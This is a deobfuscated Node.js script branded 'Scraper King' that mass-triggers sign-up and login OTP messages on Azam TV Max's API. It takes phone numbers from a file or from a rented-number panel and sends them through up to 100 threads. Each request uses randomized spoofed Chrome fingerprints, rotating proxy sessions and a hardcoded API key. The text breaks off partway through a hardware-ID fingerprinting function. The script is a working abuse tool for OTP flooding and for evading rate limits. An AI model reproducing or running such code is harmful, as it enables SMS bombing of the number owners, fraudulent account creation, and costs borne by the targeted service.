// === SCRAPER KING - Fully Deobfuscated ===
// File: azamtv_payload.deobf.js
// Note: Original variable names lost to obfuscation

const fs = require('fs'), path = require('path'), {execSync} = require('child_process'), {isMainThread} = require('worker_threads');
if (isMainThread) {
  const requiredModules = [
    'https-proxy-agent',
    'socks-proxy-agent',
    'chalk'
  ];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (err) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log('\n[SETUP] First time setup: Installing required dependencies...');
    try {
      const opts = {};
      opts.stdio = 'inherit';
      execSync('npm install https-proxy-agent socks-proxy-agent chalk@4', opts);
      console.log('[SETUP] Dependencies installed successfully!\n');
    } catch (err2) {
      console.error('[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly.');
      process.exit(1);
    }
  }
}
const http = require('http'), https = require('https'), zlib = require('zlib'), crypto = require('crypto'), chalk = require('chalk'), readline = require('readline'), {HttpsProxyAgent} = require('https-proxy-agent');
(function () {
  const _p = function () {
    let _q;
    try {
      _q = Function('return (function() ' + '{}.constructor("return this")( )' + ');')();
    } catch (err3) {
      _q = window;
    }
    return _q;
  };
  const _r = _p();
  _r.setInterval(_o, 4000);
}());
const {SocksProxyAgent} = require('socks-proxy-agent');
let SUCCESSFUL_FILE = 'successful.txt', FAILED_FILE = 'failed.txt', DEBUG_FILE = 'debug.txt';
function debugLog(_s, _t, _u) {
  try {
    const _v = new Date().toISOString(), _w = '[' + _v + '] [' + _s + '] [' + _t + ']\n' + (typeof _u === 'object' ? JSON.stringify(_u, null, 2) : String(_u)) + '\n' + '\u2500'.repeat(80) + '\n';
    fs.appendFileSync(DEBUG_FILE, _w, 'utf8');
  } catch (err4) {
  }
}
const B = chalk.hex('#00C9A7'), C = chalk.hex('#FFD700'), Y = chalk.hex('#FF6B35'), W = chalk.white, G = chalk.gray;
const R = chalk.hex('#FF4466'), DIM = chalk.hex('#555555');
function printHeader() {
  const parts = '4|6|9|2|3|1|8|7|10|0|11|5|12'.split('|');
  let _x = 0;
  while (true) {
    switch (parts[_x++]) {
    case '0':
      console.log(W('\u2502 [\u2022] Status    : ') + G('Premium License              ') + W('\u2502'));
      continue;
    case '1':
      console.log(Y('/_/  |_/___/\\__,_/_/ /_/ /_//_/    |_|_|  \n'));
      continue;
    case '2':
      console.log(C('  / /| /_  / / __ `/ __ `__ \\ / /  | |/ /   '));
      continue;
    case '3':
      console.log(C(' / ___ |/ /_/ /_/ / / / / / // /   |   /    '));
      continue;
    case '4':
      process.stdout.write('\x1B[2J\x1B[3J\x1B[H');
      continue;
    case '5':
      console.log(W('\u2502 [\u2022] Version   : ') + B('AZTV-V1.0.0                  ') + W('\u2502'));
      continue;
    case '6':
      console.log(B('    ___                       _____ _   __  '));
      continue;
    case '7':
      console.log(W('\u2502 [\u2022] Author    : ') + B('Scraper King                 ') + W('\u2502'));
      continue;
    case '8':
      console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
      continue;
    case '9':
      console.log(B('   /   |____  ____ _____ ___ /_  __| | / /  '));
      continue;
    case '10':
      console.log(W('\u2502 [\u2022] Telegram  : ') + C('t.me/scraper_king            ') + W('\u2502'));
      continue;
    case '11':
      console.log(W('\u2502 [\u2022] Target    : ') + Y('Azam TV Max \u2014 OTP Trigger    ') + W('\u2502'));
      continue;
    case '12':
      console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n'));
      continue;
    }
    break;
  }
}
class NexaRateLimiter {
  constructor(_y) {
    this.delayMs = _y;
    this.queue = [];
    this.processing = false;
  }
  enqueue(_z) {
    return new Promise((resolve, reject) => {
      this.queue.push(async () => {
        try {
          resolve(await _z());
        } catch (err5) {
          reject(err5);
        }
      });
      if (!this.processing)
        this._process();
    });
  }
  async _process() {
    this.processing = true;
    while (this.queue.length > 0) {
      const _A = this.queue.shift();
      await _A();
      await new Promise(resolve2 => setTimeout(resolve2, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(_B, _C, _D) {
  return new Promise((resolve3, reject2) => {
    const opts2 = {};
    opts2.range = _C;
    opts2.format = 'normal';
    const _E = JSON.stringify(opts2), opts3 = {
        'hostname': 'nexaotpservice.com',
        'port': 80,
        'path': _D || '/api/v1/numbers/get',
        'method': 'POST',
        'headers': {
          'X-API-Key': _B,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(_E)
        }
      }, _F = http.request(opts3, _G => {
        let _H = '';
        _G.on('data', _I => _H += _I);
        _G.on('end', () => {
          try {
            const _J = JSON.parse(_H);
            if (_J.success && _J.number) {
              resolve3(_J.number.replace(/[^0-9]/g, ''));
            } else {
              reject2(new Error(_J.error || 'NexaOTP: No number returned'));
            }
          } catch (err6) {
            reject2(new Error('NexaOTP: Invalid response'));
          }
        });
      });
    _F.on('error', _K => reject2(new Error('NexaOTP network: ' + _K.message)));
    _F.setTimeout(10000, () => {
      _F.destroy();
      reject2(new Error('NexaOTP: Timeout'));
    });
    _F.write(_E);
    _F.end();
  });
}
function normalizePhoneNumber(_L) {
  let _M = _L.trim();
  if (!_M.startsWith('+'))
    _M = '+' + _M;
  return _M;
}
const opts4 = {};
opts4.v = 126;
opts4.buildMin = 6478;
opts4.buildMax = 6532;
opts4.grease = '"Not/A)Brand";v="8"';
const opts5 = {};
opts5.v = 127;
opts5.buildMin = 6533;
opts5.buildMax = 6612;
opts5.grease = '"Not)A;Brand";v="99"';
const opts6 = {};
opts6.v = 128;
opts6.buildMin = 6613;
opts6.buildMax = 6667;
opts6.grease = '"Not;A=Brand";v="8"';
const opts7 = {};
opts7.v = 129;
opts7.buildMin = 6668;
opts7.buildMax = 6722;
opts7.grease = '"Not=A?Brand";v="8"';
const opts8 = {};
opts8.v = 130;
opts8.buildMin = 6723;
opts8.buildMax = 6777;
opts8.grease = '"Not?A_Brand";v="99"';
const opts9 = {};
opts9.v = 131;
opts9.buildMin = 6778;
opts9.buildMax = 6833;
opts9.grease = '"Not_A Brand";v="24"';
const opts10 = {};
opts10.v = 132;
opts10.buildMin = 6834;
opts10.buildMax = 6942;
opts10.grease = '"Not A(Brand";v="8"';
const opts11 = {};
opts11.v = 133;
opts11.buildMin = 6943;
opts11.buildMax = 6997;
opts11.grease = '"Not(A;Brand";v="99"';
const opts12 = {};
opts12.v = 134;
opts12.buildMin = 6998;
opts12.buildMax = 7048;
opts12.grease = '"Not;A)Brand";v="24"';
const opts13 = {};
opts13.v = 135;
opts13.buildMin = 7049;
opts13.buildMax = 7102;
opts13.grease = '"Not)A=Brand";v="8"';
const opts14 = {};
opts14.v = 136;
opts14.buildMin = 7103;
opts14.buildMax = 7150;
opts14.grease = '"Not=A_Brand";v="99"';
const opts15 = {};
opts15.v = 137;
opts15.buildMin = 7151;
opts15.buildMax = 7203;
opts15.grease = '"Not/A)Brand";v="8"';
const opts16 = {};
opts16.v = 138;
opts16.buildMin = 7204;
opts16.buildMax = 7257;
opts16.grease = '"Not)A;Brand";v="99"';
const opts17 = {};
opts17.v = 139;
opts17.buildMin = 7258;
opts17.buildMax = 7293;
opts17.grease = '"Not;A=Brand";v="24"';
const opts18 = {};
opts18.v = 140;
opts18.buildMin = 7294;
opts18.buildMax = 7327;
opts18.grease = '"Not=A?Brand";v="8"';
const opts19 = {};
opts19.v = 141;
opts19.buildMin = 7328;
opts19.buildMax = 7358;
opts19.grease = '"Not?A_Brand";v="24"';
const opts20 = {};
opts20.v = 142;
opts20.buildMin = 7359;
opts20.buildMax = 7394;
opts20.grease = '"Not_A Brand";v="8"';
const opts21 = {};
opts21.v = 143;
opts21.buildMin = 7395;
opts21.buildMax = 7414;
opts21.grease = '"Not A(Brand";v="99"';
const opts22 = {};
opts22.v = 144;
opts22.buildMin = 7415;
opts22.buildMax = 7421;
opts22.grease = '"Not(A;Brand";v="8"';
const opts23 = {};
opts23.v = 145;
opts23.buildMin = 7422;
opts23.buildMax = 7427;
opts23.grease = '"Not;A)Brand";v="24"';
const opts24 = {};
opts24.v = 146;
opts24.buildMin = 7428;
opts24.buildMax = 7451;
opts24.grease = '"Not)A=Brand";v="99"';
const opts25 = {};
opts25.v = 147;
opts25.buildMin = 7452;
opts25.buildMax = 7477;
opts25.grease = '"Not=A_Brand";v="8"';
const opts26 = {};
opts26.v = 148;
opts26.buildMin = 7478;
opts26.buildMax = 7497;
opts26.grease = '"Not/A)Brand";v="24"';
const opts27 = {};
opts27.v = 149;
opts27.buildMin = 7498;
opts27.buildMax = 7549;
opts27.grease = '"Not)A;Brand";v="24"';
const CHROME_VERSIONS = [
  opts4,
  opts5,
  opts6,
  opts7,
  opts8,
  opts9,
  opts10,
  opts11,
  opts12,
  opts13,
  opts14,
  opts15,
  opts16,
  opts17,
  opts18,
  opts19,
  opts20,
  opts21,
  opts22,
  opts23,
  opts24,
  opts25,
  opts26,
  opts27
];
function getRandomClient() {
  const _N = CHROME_VERSIONS, _O = Math.random() < 0 + 0.6, _P = _O ? _N.slice(10) : _N, _Q = _P[Math.floor(Math.random() * _P.length)], _R = Math.floor(Math.random() * (_Q.buildMax - _Q.buildMin + 1)) + _Q.buildMin, _S = Math.floor(Math.random() * 200) + 1, _T = Math.random() < 0 + 0.35, _U = !_T && Math.random() < 0 + 0.5;
  let _V, _W, _X;
  if (_T)
    _V = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _Q.v + '.0.' + _R + '.' + _S + ' Safari/537.36', _W = '"macOS"', _X = '"10.15.7"';
  else
    _U ? (_V = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _Q.v + '.0.' + _R + '.' + _S + ' Safari/537.36', _W = '"Windows"', _X = '"15.0.0"') : (_V = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _Q.v + '.0.' + _R + '.' + _S + ' Safari/537.36', _W = '"Windows"', _X = '"10.0.0"');
  const opts28 = {};
  opts28.userAgent = _V;
  opts28.secChUa = '"Google Chrome";v="' + _Q.v + '", "Chromium";v="' + _Q.v + '", ' + _Q.grease;
  opts28.secChUaPlatform = _W;
  opts28.secChUaPlatformVersion = _X;
  opts28.chromeVersion = _Q.v;
  return opts28;
}
function parseProxy(_Y) {
  if (!_Y)
    return null;
  if (typeof _Y === 'object')
    return _Y;
  _Y = _Y.trim();
  if (!_Y)
    return null;
  let _Z, _aa, _ba, _ca;
  if (_Y.includes('://'))
    _Y = _Y.split('://')[1];
  if (_Y.includes('@')) {
    const parts2 = _Y.split('@'), parts3 = parts2[0].split(':'), parts4 = parts2[1].split(':');
    _ba = parts3[0];
    _ca = parts3[1];
    _Z = parts4[0];
    _aa = parseInt(parts4[1]);
  } else {
    const parts5 = _Y.split(':');
    if (parts5.length === 2) {
      _Z = parts5[0];
      _aa = parseInt(parts5[1]);
    } else {
      if (parts5.length === 4) {
        !isNaN(parseInt(parts5[3])) && isNaN(parseInt(parts5[1])) ? (_ba = parts5[0], _ca = parts5[1], _Z = parts5[2], _aa = parseInt(parts5[3])) : (_Z = parts5[0], _aa = parseInt(parts5[1]), _ba = parts5[2], _ca = parts5[3]);
      } else {
        if (parts5.length === 3) {
          _Z = parts5[0];
          _aa = parseInt(parts5[1]);
          _ba = parts5[2];
        }
      }
    }
  }
  if (!_Z || !_aa)
    return null;
  const opts29 = {};
  opts29.type = 'http';
  opts29.host = _Z;
  opts29.port = _aa;
  opts29.user = _ba;
  opts29.pass = _ca;
  opts29.original = _Y;
  return opts29;
}
function rotateSessionId(_da) {
  if (!_da || !_da.user)
    return _da;
  const opts30 = { ..._da };
  const _ea = opts30;
  if (_ea.user.includes('-ssid-')) {
    const _fa = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
    _ea.user = _ea.user.replace(/-ssid-[A-Za-z0-9_]+/, '-ssid-' + _fa);
  } else {
    if (_ea.user.includes('-session-')) {
      const _ga = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
      _ea.user = _ea.user.replace(/-session-[A-Za-z0-9_]+/, '-session-' + _ga);
    } else {
      if (/_sid_/i.test(_ea.user)) {
        const _ha = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
        _ea.user = _ea.user.replace(/_sid_[A-Za-z0-9]+/i, '_sid_' + _ha);
      }
    }
  }
  return _ea;
}
function createProxyAgent(_ia) {
  if (!_ia)
    return null;
  const _ja = typeof _ia === 'string' ? parseProxy(_ia) : _ia;
  if (!_ja)
    return null;
  let _ka = '';
  if (_ja.type === 'socks5' || _ja.type === 'socks4')
    return _ka = 'socks5://' + (_ja.user ? encodeURIComponent(_ja.user) + ':' + encodeURIComponent(_ja.pass || '') + '@' : '') + _ja.host + ':' + _ja.port, new SocksProxyAgent(_ka);
  else {
    _ka = 'http://' + (_ja.user ? encodeURIComponent(_ja.user) + ':' + encodeURIComponent(_ja.pass || '') + '@' : '') + _ja.host + ':' + _ja.port;
    return new HttpsProxyAgent(_ka);
  }
}
function sendRequest(_la, _ma, _na, _oa, _pa = null, _qa = 20000) {
  return new Promise((resolve4, reject3) => {
    const uRL = new URL(_la);
    const opts31 = { ..._na };
    let _ra = opts31;
    !_ra['Accept-Encoding'] && (_ra['Accept-Encoding'] = 'gzip, deflate, br');
    _oa && (_ra['Content-Length'] = Buffer.byteLength(_oa));
    const opts32 = {
      'hostname': uRL.hostname,
      'path': uRL.pathname + uRL.search,
      'method': _ma,
      'headers': _ra,
      'timeout': _qa
    };
    if (_pa) {
      const _sa = typeof _pa === 'object' ? _pa : parseProxy(_pa);
      if (!_sa || isNaN(_sa.port) || _sa.port <= 0)
        return reject3(new Error('FATAL: Invalid proxy. Aborting to prevent IP leak.'));
      opts32.agent = createProxyAgent(_sa);
    }
    const _ta = https.request(opts32, _ua => {
      const arr = [];
      _ua.on('data', _va => arr.push(_va));
      _ua.on('error', reject3);
      _ua.on('end', () => {
        let _wa = Buffer.concat(arr);
        const _xa = _ua.headers['content-encoding'];
        if (_xa === 'gzip') {
          try {
            _wa = zlib.gunzipSync(_wa);
          } catch (err7) {
          }
        } else {
          if (_xa === 'deflate')
            try {
              _wa = zlib.inflateSync(_wa);
            } catch (err8) {
            }
          else {
            if (_xa === 'br')
              try {
                _wa = zlib.brotliDecompressSync(_wa);
              } catch (err9) {
              }
          }
        }
        resolve4({
          'status': _ua.statusCode,
          'data': _wa.toString('utf8'),
          'headers': _ua.headers
        });
      });
    });
    _ta.on('error', reject3);
    _ta.on('timeout', () => {
      _ta.destroy();
      reject3(new Error('timeout'));
    });
    if (_oa)
      _ta.write(_oa);
    _ta.end();
  });
}
async function triggerOTP(_ya, _za = {}) {
  const {
      onStatus: onStatus = () => {
      },
      proxy: proxy = null,
      timeout: timeout = 20000,
      flowType: flowType = 'SIGN_UP'
    } = _za, _Aa = normalizePhoneNumber(_ya), _Ba = getRandomClient(), opts33 = {};
  opts33.accept = 'application/json, text/plain, */*';
  opts33['accept-encoding'] = 'gzip, deflate, br, zstd';
  opts33['accept-language'] = 'en-US,en;q=0.9';
  opts33.authorization = 'Bearer null';
  opts33['content-type'] = 'application/json';
  opts33.language = 'eng';
  opts33.languagecode = 'eng';
  opts33.local = 'BD';
  opts33.origin = 'https://web.azamtvmax.com';
  opts33.platform = 'WEB';
  opts33.priority = 'u=1, i';
  opts33.referer = 'https://web.azamtvmax.com/';
  opts33.requestcount = '0';
  opts33['sec-ch-ua'] = _Ba.secChUa;
  opts33['sec-ch-ua-mobile'] = '?0';
  opts33['sec-ch-ua-platform'] = _Ba.secChUaPlatform;
  opts33['sec-ch-ua-platform-version'] = _Ba.secChUaPlatformVersion;
  opts33['sec-fetch-dest'] = 'empty';
  opts33['sec-fetch-mode'] = 'cors';
  opts33['sec-fetch-site'] = 'cross-site';
  opts33.tenant_identifier = 'master';
  opts33['user-agent'] = _Ba.userAgent;
  opts33['x-api-key'] = 'ed6becd6cd33';
  const _Ca = opts33;
  try {
    onStatus('[1/1] Sending OTP to ' + _Aa + ' (flowType: ' + flowType + ')...');
    const opts34 = {};
    opts34.phone = _Aa;
    opts34.flowType = flowType;
    const _Da = JSON.stringify(opts34), _Ea = await sendRequest('https://api.aztv.videoready.tv/login/auth/v1/pub/create-otp', 'POST', _Ca, _Da, proxy, timeout);
    debugLog(_Aa, 'otp-res', _Ea.data);
    const _Fa = _Ea.data ? (() => {
      try {
        return JSON.parse(_Ea.data);
      } catch {
        return {};
      }
    })() : {};
    if (_Fa.status === true) {
      onStatus('[1/1] \u2705 OTP Dispatched');
      const opts35 = {};
      opts35.success = true;
      opts35.message = 'OTP Triggered (' + flowType + ')';
      opts35.phone = _Aa;
      opts35.flow = flowType;
      opts35.requestId = _Fa.requestId;
      return opts35;
    } else {
      if (_Ea.status === 429)
        throw new Error('Rate Limited (429) \u2014 Too many requests from this IP');
      else {
        const _Ga = _Fa.message || _Fa.error || 'Failed (HTTP ' + _Ea.status + ')', _Ha = _Fa.errorCode ? ' [' + _Fa.errorCode + ']' : '';
        throw new Error('' + _Ga + _Ha);
      }
    }
  } catch (err10) {
    const opts36 = {};
    opts36.success = false;
    opts36.message = '' + err10.message;
    opts36.phone = _Aa;
    return opts36;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(_Ia) {
      const parts6 = '2|1|4|0|3'.split('|');
      let _Ja = 0;
      while (true) {
        switch (parts6[_Ja++]) {
        case '0':
          this.failed = 0;
          continue;
        case '1':
          this.processed = 0;
          continue;
        case '2':
          this.totalNumbers = _Ia;
          continue;
        case '3':
          this.startTime = Date.now();
          continue;
        case '4':
          this.successful = 0;
          continue;
        }
        break;
      }
    }
    addLog(_Ka, _La) {
      let _Ma = '';
      if (_La === 'success') {
        _Ma = chalk.hex('#00C9A7').bold(' \u2726 Scraper King') + chalk.hex('#555555')(' \u2502 ') + chalk.hex('#00C9A7')('OTP Sent') + chalk.hex('#555555')(' \u2192 ') + chalk.hex('#FFD700').bold(_Ka.replace('Triggered OTP for ', ''));
      } else {
        if (_La === 'retry')
          _Ma = chalk.hex('#FFD700').bold(' \u21BB Scraper King') + chalk.hex('#555555')(' \u2502 ') + chalk.hex('#FFD700')(_Ka);
        else {
          const match = _Ka.match(/\+?\d{7,}/), _Na = match ? match[0] : '', _Oa = _Ka.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          _Ma = chalk.hex('#FF4466').bold(' \u2717 Scraper King') + chalk.hex('#555555')(' \u2502 ') + chalk.hex('#FF4466')(_Na ? '' + _Na : '') + chalk.hex('#555555')(_Na ? ' \u2192 ' : '') + chalk.hex('#888888')(_Oa);
        }
      }
      process.stdout.write('\r\x1B[K' + _Ma + '\n');
      this.render();
    }
    setStatus(_Pa) {
    }
    update() {
    }
    render() {
      const _Qa = this.processed / Math.max(this.totalNumbers, 1), _Ra = (_Qa * 100).toFixed(1), _Sa = 20;
      const _Ta = Math.round(_Qa * _Sa);
      const _Ua = _Sa - _Ta, _Va = chalk.hex('#00C9A7')('\u2588'.repeat(_Ta)) + chalk.hex('#333333')('\u2591'.repeat(_Ua));
      const _Wa = '  ' + chalk.hex('#00C9A7').bold('Scraper King') + chalk.hex('#555555')(' \u2B9E ') + _Va + chalk.hex('#888888')(' ' + _Ra + '%') + chalk.hex('#555555')('  \u2502  ') + chalk.hex('#00C9A7').bold('\u2713 ' + this.successful) + chalk.hex('#555555')('  ') + chalk.hex('#FF4466').bold('\u2717 ' + this.failed) + chalk.hex('#555555')('  [' + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write('\r\x1B[K' + _Wa);
    }
    stop() {
      process.stdout.write('\x1B[2K\r\n');
      const _Xa = Math.floor((Date.now() - this.startTime) / 1000), _Ya = Math.floor(_Xa / 60), _Za = _Xa % 60;
      const _ab = _Ya + 'm ' + _Za + 's';
      console.log(C('  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
      console.log(C('  \u2551') + W.bold('  AZAM TV OTP TRIGGER \u2014 COMPLETE            ') + C('\u2551'));
      console.log(C('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
      console.log(C('  \u2551') + ('  ' + chalk.greenBright('Successful') + '   ' + chalk.greenBright(String(this.successful).padStart(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u2551') + ('  ' + chalk.red('Failed') + '       ' + chalk.red(String(this.failed).padStart(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u2551') + ('  ' + chalk.cyan('Total Time') + '   ' + chalk.cyan(_ab.padEnd(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
    }
  }
  async function selectOption(_bb, _cb) {
    return new Promise(resolve5 => {
      let _db = 0;
      process.stdin.resume();
      readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY)
        process.stdin.setRawMode(true);
      const _eb = () => {
        process.stdout.write('\x1B[2J\x1B[H');
        printHeader();
        console.log('   \x1B[33m' + _bb + '\x1B[0m\n');
        _cb.forEach((item, index) => {
          index === _db ? console.log('   \x1B[36m\u2794\x1B[35m ' + item.name + '\x1B[0m') : console.log('     \x1B[90m' + item.name + '\x1B[0m');
        });
      };
      _eb();
      const _fb = (_gb, _hb) => {
        if (_hb.ctrl && _hb.name === 'c')
          process.exit(0);
        if (_hb.name === 'up')
          _db = (_db - 1 + _cb.length) % _cb.length, _eb();
        else {
          if (_hb.name === 'down')
            _db = (_db + 1) % _cb.length, _eb();
          else
            _hb.name === 'return' && (process.stdin.setRawMode(false), process.stdin.removeListener('keypress', _fb), resolve5(_cb[_db].value));
        }
      };
      process.stdin.on('keypress', _fb);
    });
  }
  async function promptText(_ib, _jb) {
    return new Promise(resolve6 => {
      process.stdout.write('   \x1B[33m' + _ib + '\x1B[0m ');
      let _kb = '';
      if (process.stdin.isTTY)
        process.stdin.setRawMode(false);
      process.stdin.resume();
      const _lb = _mb => {
        const _nb = _mb.toString();
        if (_nb.includes('\n') || _nb.includes('\r')) {
          process.stdin.removeListener('data', _lb);
          _kb += _nb.split(/[\r\n]/)[0];
          let _ob = _kb.trim();
          if (_ob.startsWith('"') && _ob.endsWith('"'))
            _ob = _ob.slice(1, -1);
          resolve6(_ob || _jb);
        } else
          _kb += _nb;
      };
      process.stdin.on('data', _lb);
    });
  }
  async function interactiveWizard() {
    process.stdout.write('\x1B[2J\x1B[H');
    printHeader();
    console.log(W.bold('  --- SCRAPER AZTV AI  ---\n'));
    const _pb = await selectOption('SELECT NUMBER SOURCE', [
      {
        'name': '\uD83D\uDCC1 Load from file (numbers.txt)',
        'value': 'file'
      },
      {
        'name': '\uD83C\uDF10 Auto fetch from NexaOTP Panel',
        'value': 'nexa'
      }
    ]);
    let _qb = 'numbers.txt';
    let _rb = null;
    if (_pb === 'nexa') {
      let _sb = '';
      const _tb = path.join(__dirname, '.nexa_api_key');
      if (fs.existsSync(_tb)) {
        const _ub = fs.readFileSync(_tb, 'utf8').trim(), _vb = await selectOption('Found saved API Key (...' + _ub.slice(-4) + '). Use it?', [
            {
              'name': 'Yes, use saved key',
              'value': 'yes'
            },
            {
              'name': 'No, enter new key',
              'value': 'no'
            },
            {
              'name': 'Delete saved key',
              'value': 'delete'
            }
          ]);
        if (_vb === 'yes') {
          _sb = _ub;
        } else
          _vb === 'delete' && (fs.unlinkSync(_tb), console.log(G('\n   \u2717 Saved key deleted.\n')));
      }
      if (!_sb) {
        _sb = await promptText('Enter NexaOTP API Key:', '');
        const opts37 = {};
        opts37.name = 'No';
        opts37.value = 'no';
        const _wb = await selectOption('Save this key for future use?', [
          {
            'name': 'Yes, save it',
            'value': 'yes'
          },
          opts37
        ]);
        if (_wb === 'yes') {
          fs.writeFileSync(_tb, _sb, 'utf8');
          console.log(G('\n   \u2713 API key saved.\n'));
        }
      }
      let arr2 = [], _xb = true;
      while (_xb) {
        const _yb = await promptText('Enter range #' + (arr2.length + 1) + ' (e.g. 21624485XXX):', '');
        if (_yb)
          arr2.push(_yb);
        const _zb = await selectOption('Add another range?', [
          {
            'name': 'Yes',
            'value': 'yes'
          },
          {
            'name': 'No, proceed',
            'value': 'no'
          }
        ]);
        if (_zb === 'no')
          _xb = false;
      }
      arr2.length === 0 && (console.log(R('\n   \u2717 You must provide at least one range.\n')), process.exit(1));
      const _Ab = await promptText('How many numbers to process? (e.g. 100):', '50'), _Bb = parseInt(_Ab) || 50, _Cb = await selectOption('SELECT NEXA SERVER', [
          {
            'name': 'Server 1 (/get)',
            'value': '/api/v1/numbers/get'
          },
          {
            'name': 'Server 2 (/p2/get)',
            'value': '/api/v1/numbers/p2/get'
          },
          {
            'name': 'Server 3 (/p3/get)',
            'value': '/api/v1/numbers/p3/get'
          }
        ]), opts38 = {};
      opts38.apiKey = _sb;
      opts38.ranges = arr2;
      opts38.totalCount = _Bb;
      opts38.serverEndpoint = _Cb;
      _rb = opts38;
    } else {
      _qb = await promptText('Enter Numbers File Path [default: numbers.txt]:', 'numbers.txt');
      if (!fs.existsSync(_qb))
        fs.writeFileSync(_qb, '');
    }
    let _Db = await promptText('Enter Proxies File Path (Leave blank for direct) [default: none]:', 'none');
    if (_Db === 'none' || _Db === '')
      _Db = '';
    const _Eb = await selectOption('SELECT THREADS', [
      {
        'name': '10 Threads',
        'value': 10
      },
      {
        'name': '20 Threads (Default)',
        'value': 20
      },
      {
        'name': '50 Threads (Fast)',
        'value': 50
      },
      {
        'name': '100 Threads (Extreme)',
        'value': 100
      }
    ]);
    const _Fb = await selectOption('SELECT FLOW TYPE', [
      {
        'name': '\uD83C\uDD95 SIGN_UP  (New Account OTP)',
        'value': 'SIGN_UP'
      },
      {
        'name': '\uD83D\uDD11 SIGN_IN  (Login OTP)',
        'value': 'SIGN_IN'
      },
      {
        'name': '\uD83D\uDD04 AUTO     (Detect per account)',
        'value': 'AUTO'
      }
    ]);
    process.stdin.pause();
    return {
      'numbersFile': _qb,
      'threads': String(_Eb),
      'proxiesFile': _Db,
      'flow': _Fb,
      'nexaConfig': _rb
    };
  }
  function generateHWID() {
    const _Gb = require('os');
    const _Hb = _Gb.platform();
    try {
      if (_Hb === 'win32') {
        const _Ib = execSync('powershell -NoProfile -Command "' + '$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; ' + '$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; ' + '$disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; ' + '$mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; ' + 'Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
          'stdio': 'pipe',
          'timeout': 15000
        }).toString().trim();
        if (!_Ib)
          throw new Error('No hardware data');
        const _Jb = crypto.createHash('sha256').update(_Ib).digest('hex').toUpperCase();
        return 'ANKING-7BA3FB09-723F-A500';
      } else {
        let arr3 = [];
        try {
          const _Kb = execSync('settings get secure android_id 2>/dev/null || echo ""', {
            'stdio': 'pipe',
            'timeout': 5000
          }).toString().trim();
          if (_Kb && _Kb !== 'null')
            arr3.push('A:' + _Kb);
        } catch (err11) {
        }
        try {
          if (fs.existsSync('/proc/cpuinfo')) {
            const _Lb = fs.readFileSync('/proc/cpuinfo', 'utf8'), match2 = _Lb.match(/Serial\s*:\s*(\S+)/i), match3 = _Lb.match(/Hardware\s*:\s*(.+)/i);
            if (match2 && match2[1] !== '0000000000000000')
              arr3.push('S:' + match2[1].trim());
            if (match3)
              arr3.push('H:' + match3[1].trim());
          }
        } catch (err12) {
        }
        try {
          if (fs.existsSync('/etc/machine-id')) {
            const _Mb = fs.readFileSync('/etc/machine-id', 'utf8').trim();
            if (_Mb)
              arr3.push('M:' + _Mb);
          }
        } catch (err13) {
        }
        try {
